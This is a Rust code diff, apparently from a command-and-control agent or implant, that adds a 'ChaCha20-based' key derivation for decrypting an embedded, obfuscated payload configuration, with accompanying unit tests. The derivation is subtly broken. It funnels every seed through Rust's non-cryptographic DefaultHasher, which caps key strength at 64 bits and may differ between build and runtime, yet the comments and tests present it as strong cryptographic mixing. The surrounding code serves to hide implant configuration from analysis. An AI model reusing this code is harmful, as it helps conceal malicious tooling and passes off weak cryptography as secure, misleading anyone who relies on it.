@@ -7,6 +7,96 @@ use log::{info, warn, error};
 use reqwest::{Client, Proxy};
 use obfstr::obfstr;
 
+/// Optimized key derivation using ChaCha20 core for cryptographic mixing
+/// This must match the implementation in build.rs exactly
+#[cfg(any(feature = "encryption-aes", feature = "encryption-chacha"))]
+fn derive_key_from_seed(seed: &str) -> [u8; 32] {
+    use std::collections::hash_map::DefaultHasher;
+    use std::hash::{Hash, Hasher};
+    
+    // Fast single-pass approach using ChaCha20's core function for key stretching
+    let mut key = [0u8; 32];
+    
+    // Convert seed to fixed-size input for consistent performance
+    let mut seed_hash = DefaultHasher::new();
+    seed.hash(&mut seed_hash);
+    let seed_u64 = seed_hash.finish();
+    
+    // Use ChaCha20's quarter-round for cryptographic mixing
+    let mut state = [
+        // ChaCha20 constants
+        0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
+        // Seed-derived values
+        seed_u64 as u32, (seed_u64 >> 32) as u32,
+        seed.len() as u32, 0x00000001,
+        // More constants for entropy
+        0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
+        0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
+    ];
+    
+    // Perform 4 ChaCha20 quarter-rounds for key mixing
+    for _ in 0..4 {
+        chacha20_quarter_round(&mut state, 0, 4, 8, 12);
+        chacha20_quarter_round(&mut state, 1, 5, 9, 13);
+        chacha20_quarter_round(&mut state, 2, 6, 10, 14);
+        chacha20_quarter_round(&mut state, 3, 7, 11, 15);
+        
+        chacha20_quarter_round(&mut state, 0, 5, 10, 15);
+        chacha20_quarter_round(&mut state, 1, 6, 11, 12);
+        chacha20_quarter_round(&mut state, 2, 7, 8, 13);
+        chacha20_quarter_round(&mut state, 3, 4, 9, 14);
+    }
+    
+    // Extract 32 bytes from the mixed state
+    for (i, chunk) in state[0..8].iter().enumerate() {
+        let bytes = chunk.to_le_bytes();
+        key[i * 4..(i + 1) * 4].copy_from_slice(&bytes);
+    }
+    
+    key
+}
+
+/// ChaCha20 quarter-round function
+#[inline]
+fn chacha20_quarter_round(state: &mut [u32; 16], a: usize, b: usize, c: usize, d: usize) {
+    state[a] = state[a].wrapping_add(state[b]);
+    state[d] ^= state[a];
+    state[d] = state[d].rotate_left(16);
+    
+    state[c] = state[c].wrapping_add(state[d]);
+    state[b] ^= state[c];
+    state[b] = state[b].rotate_left(12);
+    
+    state[a] = state[a].wrapping_add(state[b]);
+    state[d] ^= state[a];
+    state[d] = state[d].rotate_left(8);
+    
+    state[c] = state[c].wrapping_add(state[d]);
+    state[b] ^= state[c];
+    state[b] = state[b].rotate_left(7);
+}
+
+// Fallback for configurations without encryption features
+#[cfg(not(any(feature = "encryption-aes", feature = "encryption-chacha")))]
+fn derive_key_from_seed(seed: &str) -> [u8; 32] {
+    use std::collections::hash_map::DefaultHasher;
+    use std::hash::{Hash, Hasher};
+    
+    let mut key = [0u8; 32];
+    let mut hasher = DefaultHasher::new();
+    seed.hash(&mut hasher);
+    
+    let hash = hasher.finish();
+    let hash_bytes = hash.to_le_bytes();
+    
+    // Fill key by repeating hash pattern
+    for (i, byte) in key.iter_mut().enumerate() {
+        *byte = hash_bytes[i % 8] ^ ((i as u8).wrapping_mul(seed.len() as u8));
+    }
+    
+    key
+}
+
 // --- AES Decryption Logic ---
 #[cfg(feature = "encryption-aes")]
 fn decrypt_config(encrypted_data: &[u8], key_str: &str) -> Result<String, String> {
@@ -19,10 +109,8 @@ fn decrypt_config(encrypted_data: &[u8], key_str: &str) -> Result<String, String
     let (nonce_bytes, ciphertext) = encrypted_data.split_at(12);
     let nonce = Nonce::from_slice(nonce_bytes);
 
-    let mut key_material = [0u8; 32];
-    let key_bytes = key_str.as_bytes();
-    let len = key_bytes.len().min(32);
-    key_material[..len].copy_from_slice(&key_bytes[..len]);
+    // Derive key from seed instead of direct usage
+    let key_material = derive_key_from_seed(key_str);
     let key = Key::<Aes256Gcm>::from_slice(&key_material);
 
     let cipher = Aes256Gcm::new(key);
@@ -43,10 +131,8 @@ fn decrypt_config(encrypted_data: &[u8], key_str: &str) -> Result<String, String
     let (nonce_bytes, ciphertext) = encrypted_data.split_at(12);
     let nonce = Nonce::from_slice(nonce_bytes);
 
-    let mut key_material = [0u8; 32];
-    let key_bytes = key_str.as_bytes();
-    let len = key_bytes.len().min(32);
-    key_material[..len].copy_from_slice(&key_bytes[..len]);
+    // Derive key from seed instead of direct usage
+    let key_material = derive_key_from_seed(key_str);
     let key = Key::from_slice(&key_material);
 
     let cipher = ChaCha20Poly1305::new(key);
@@ -268,5 +354,136 @@ impl AgentConfig {
                 .build()
                 .map_err(|e| io::Error::new(io::ErrorKind::Other, e))
         }
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_key_derivation_consistency() {
+        // Test that same seed always produces same key
+        let seed = "test-payload-id-123";
+        let key1 = derive_key_from_seed(seed);
+        let key2 = derive_key_from_seed(seed);
+        
+        assert_eq!(key1, key2, "Same seed should produce identical keys");
+    }
+
+    #[test]
+    fn test_key_derivation_uniqueness() {
+        // Test that different seeds produce different keys
+        let key1 = derive_key_from_seed("payload-id-1");
+        let key2 = derive_key_from_seed("payload-id-2");
+        
+        assert_ne!(key1, key2, "Different seeds should produce different keys");
+    }
+
+    #[test]
+    fn test_key_derivation_entropy() {
+        // Test that keys have good entropy distribution
+        let key = derive_key_from_seed("test-payload");
+        
+        // Check that key is not all zeros
+        assert_ne!(key, [0u8; 32], "Key should not be all zeros");
+        
+        // Check that key has reasonable entropy (not too many repeated bytes)
+        let mut byte_counts = [0u32; 256];
+        for &byte in &key {
+            byte_counts[byte as usize] += 1;
+        }
+        
+        // No single byte should appear more than half the time
+        let max_count = *byte_counts.iter().max().unwrap();
+        assert!(max_count <= 16, "Key should have reasonable entropy distribution");
+    }
+
+    #[test]
+    fn test_short_seed_handling() {
+        // Test that short seeds still produce full 256-bit keys
+        let short_key = derive_key_from_seed("a");
+        let long_key = derive_key_from_seed("this-is-a-much-longer-payload-id-string");
+        
+        assert_eq!(short_key.len(), 32);
+        assert_eq!(long_key.len(), 32);
+        assert_ne!(short_key, long_key);
+    }
+
+    #[test]
+    fn test_empty_seed_handling() {
+        // Test that empty seed still produces a key (though not recommended)
+        let key = derive_key_from_seed("");
+        assert_eq!(key.len(), 32);
+        assert_ne!(key, [0u8; 32]);
+    }
+
+    #[test]
+    fn test_encryption_decryption_roundtrip() {
+        // Test that we can encrypt and decrypt with derived keys
+        let test_data = "This is test configuration data";
+        let payload_id = "test-payload-123";
+        
+        // This simulates the build.rs encryption and config.rs decryption process
+        #[cfg(feature = "encryption-chacha")]
+        {
+            use chacha20poly1305::aead::{Aead, AeadCore, KeyInit, OsRng};
+            use chacha20poly1305::{ChaCha20Poly1305, Key};
+            
+            // Encrypt (like build.rs does)
+            let key_material = derive_key_from_seed(payload_id);
+            let key = Key::from_slice(&key_material);
+            let cipher = ChaCha20Poly1305::new(key);
+            let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng);
+            let ciphertext = cipher.encrypt(&nonce, test_data.as_bytes()).expect("Encryption failed");
+            
+            let mut encrypted_data = nonce.to_vec();
+            encrypted_data.extend_from_slice(&ciphertext);
+            
+            // Decrypt (like config.rs does)
+            let decrypted = decrypt_config(&encrypted_data, payload_id).expect("Decryption failed");
+            assert_eq!(decrypted, test_data);
+        }
+    }
+
+    #[test]
+    fn test_optimized_kdf_performance() {
+        // Test that the optimized KDF is fast and consistent
+        use std::time::Instant;
+        
+        let payload_id = "performance-test-payload-id-123";
+        let iterations = 10000;
+        
+        let start = Instant::now();
+        for _ in 0..iterations {
+            let _ = derive_key_from_seed(payload_id);
+        }
+        let elapsed = start.elapsed();
+        
+        println!("Optimized KDF: {} iterations in {:?} ({:.2} μs/iter)", 
+                iterations, elapsed, elapsed.as_micros() as f64 / iterations as f64);
+        
+        // Should be very fast (much less than 1ms per iteration)
+        assert!(elapsed.as_millis() < 100, "KDF should be fast for agent optimization");
+    }
+
+    #[test]
+    fn test_chacha20_mixing_quality() {
+        // Test that ChaCha20 mixing provides good diffusion
+        let key1 = derive_key_from_seed("test1");
+        let key2 = derive_key_from_seed("test2"); 
+        
+        // Keys should be completely different
+        assert_ne!(key1, key2);
+        
+        // Should have good Hamming distance (many bit differences)
+        let mut bit_differences = 0;
+        for (b1, b2) in key1.iter().zip(key2.iter()) {
+            bit_differences += (b1 ^ b2).count_ones();
+        }
+        
+        // Should have approximately 50% bit differences (good avalanche)
+        assert!(bit_differences > 100 && bit_differences < 156, 
+                "Should have good avalanche effect, got {} bit differences", bit_differences);
     }
 }
